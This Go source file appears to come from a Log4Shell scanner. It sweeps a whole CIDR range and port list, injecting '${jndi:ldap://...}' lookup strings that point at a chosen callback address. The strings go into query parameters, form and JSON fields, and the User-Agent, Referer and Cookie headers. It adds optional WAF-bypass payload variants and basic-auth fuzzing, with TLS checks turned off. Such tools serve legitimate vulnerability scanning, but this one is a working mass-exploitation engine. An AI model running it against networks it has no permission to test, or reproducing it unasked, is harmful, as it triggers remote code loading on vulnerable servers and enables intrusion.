package internal

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strings"

	"golang.org/x/sync/semaphore"
)

const (
	defaultUserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
	windowsUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
	darwinUserAgent  = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
)

func Request(ctx context.Context, opts *RemoteOptions) error {
	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	transport.Proxy = http.ProxyFromEnvironment
	if len(opts.Proxies) == 1 { // TODO Allow more than one proxy
		transport.Proxy = http.ProxyURL(opts.Proxies[0])
	}

	client := &http.Client{
		Timeout:   opts.Timeout,
		Transport: transport,
	}

	if opts.NoRedirect {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}

	_, ipv4Net, err := net.ParseCIDR(opts.CIDR)
	if err != nil {
		return err
	}

	mask := binary.BigEndian.Uint32(ipv4Net.Mask)
	start := binary.BigEndian.Uint32(ipv4Net.IP)

	finish := (start & mask) | (mask ^ 0xffffffff)

	payloads, err := createPayloads(opts)
	if err != nil {
		return err
	}

	fields, err := readFields(opts)
	if err != nil {
		return err
	}

	sem := semaphore.NewWeighted(int64(opts.MaxThreads))

	for i := start; i <= finish; i++ {
		for _, payload := range payloads {
			ip := make(net.IP, 4)
			binary.BigEndian.PutUint32(ip, i)

			for _, p := range opts.Ports {
				u := fmt.Sprintf("%s://%s:%s", opts.Schema, ip, p)

				if opts.Verbose {
					log.Printf("[i] Checking %s for %s\n", payload, u)
				}

				var req *http.Request

				switch opts.RequestType {
				case "get":
					req, err = http.NewRequestWithContext(ctx, "GET", u, nil)
					if err != nil {
						return err
					}
				case "post":
					data := url.Values{}
					for _, field := range fields {
						data.Set(field, p)
					}

					req, err = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(data.Encode()))
					if err != nil {
						return err
					}
				case "json":
					values := make(map[string]string)
					for _, field := range fields {
						values[field] = p
					}

					jsonValue, err := json.Marshal(values)
					if err != nil {
						return err
					}

					req, err = http.NewRequestWithContext(ctx, "POST", u, bytes.NewBuffer(jsonValue))
					if err != nil {
						return err
					}
				}

				// Add payload as query string
				values := req.URL.Query()
				values.Add("q", payload)
				req.URL.RawQuery = values.Encode()

				if err := addHTTPHeader(req, payload, opts); err != nil {
					return err
				}

				err := sem.Acquire(ctx, 1)
				if err != nil {
					return err
				}

				go func() {
					defer sem.Release(1)

					resp, err := client.Do(req)
					if err != nil {
						// ignore
						return
					}

					resp.Body.Close()

					if !opts.NoBasicAuthFuzzing && resp.StatusCode == http.StatusUnauthorized {
						auth := resp.Header.Get("WWW-Authenticate")

						if strings.HasPrefix(auth, "Basic") {
							if opts.Verbose {
								log.Printf("[i] Checking %s for %s with basic auth\n", payload, u)

								req.SetBasicAuth(payload, payload)

								resp, err := client.Do(req)
								if err != nil {
									// ignore
									return
								}

								resp.Body.Close()
							}
						}
					}
				}()
			}
		}
	}

	return nil
}

func addHTTPHeader(req *http.Request, payload string, opts *RemoteOptions) error {
	keys, err := readHeaders(opts)
	if err != nil {
		return err
	}

	var userAgent string

	switch runtime.GOOS {
	case "windows":
		userAgent = windowsUserAgent
	case "darwin":
		userAgent = darwinUserAgent
	default:
		userAgent = defaultUserAgent
	}

	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "*/*")

	for _, h := range keys {
		if h == "User-Agent" && !opts.NoUserAgentFuzzing {
			req.Header.Set("User-Agent", payload)
			continue
		}

		if h == "Referer" {
			req.Header.Set("Referer", fmt.Sprintf("https://%s", payload))
		}

		if h == "Cookie" {
			req.Header.Set("Cookie", fmt.Sprintf("SessCookie=%s", payload))
		}

		req.Header.Add(h, payload)
	}

	return nil
}

func createPayloads(opts *RemoteOptions) ([]string, error) {
	if opts.PayLoadsFile != "" {
		t, err := template.ParseFiles(opts.PayLoadsFile)
		if err != nil {
			return nil, err
		}

		p, err := executeTemplate(t, "l4s", opts.CADDR)
		if err != nil {
			return nil, err
		}

		return parseFileContent(p), nil
	}

	payloads := []string{fmt.Sprintf("${jndi:ldap://%v/l4s}", opts.CADDR)}

	if opts.WafBypass {
		t, err := template.ParseFS(f, "resource/bypass.txt")
		if err != nil {
			return nil, err
		}

		p, err := executeTemplate(t, "l4s", opts.CADDR)
		if err != nil {
			return nil, err
		}

		payloads = append(payloads, parseFileContent(p)...)
	}

	return payloads, nil
}

func readFields(opts *RemoteOptions) ([]string, error) {
	if opts.FieldsFile != "" {
		data, err := ioutil.ReadFile(opts.FieldsFile)
		if err != nil {
			return nil, err
		}

		return parseFileContent(data), nil
	}

	data, err := f.ReadFile("resource/fields.txt")
	if err != nil {
		return nil, err
	}

	return parseFileContent(data), nil
}

func readHeaders(opts *RemoteOptions) ([]string, error) {
	if opts.HeadersFile != "" {
		data, err := ioutil.ReadFile(opts.HeadersFile)
		if err != nil {
			return nil, err
		}

		return parseFileContent(data), nil
	}

	data, err := f.ReadFile("resource/header.txt")
	if err != nil {
		return nil, err
	}

	return parseFileContent(data), nil
}

func parseFileContent(data []byte) []string {
	content := []string{}

	for _, d := range strings.Split(string(data), "\n") {
		d = strings.Trim(d, " ")
		if !strings.HasPrefix(d, "#") && d != "" { // ignore comments and empty lines
			content = append(content, d)
		}
	}

	return content
}

func executeTemplate(t *template.Template, resource string, caddr string) ([]byte, error) {
	var buf bytes.Buffer
	if err := t.Execute(&buf, map[string]string{
		"CADDR":    caddr,
		"Resource": resource,
	}); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}
